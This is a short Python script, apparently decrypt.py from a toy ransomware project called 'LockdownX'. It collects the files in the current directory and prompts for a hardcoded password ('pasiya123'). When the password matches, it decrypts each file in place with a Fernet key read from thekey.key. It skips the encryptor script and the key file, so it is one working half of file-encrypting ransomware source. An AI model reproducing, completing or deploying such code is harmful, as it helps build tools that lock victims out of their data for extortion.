#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
	if file == "LockdownX.py" or file == "thekey.key" or file == "decrypt.py" :
		continue
	if os.path.isfile(file):
		files.append(file)

with open("thekey.key", "rb") as key:
	secretkey = key.read()

pwd = "pasiya123"

user_passw = input("Enter the password to decrypt your files\n")


if user_passw == pwd :
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
	
		with open(file,"wb") as thefile:
			thefile.write(contents_decrypted)

	print ("Your Files are decrypted.")

else: 
	print("Sorry, wrong Password")
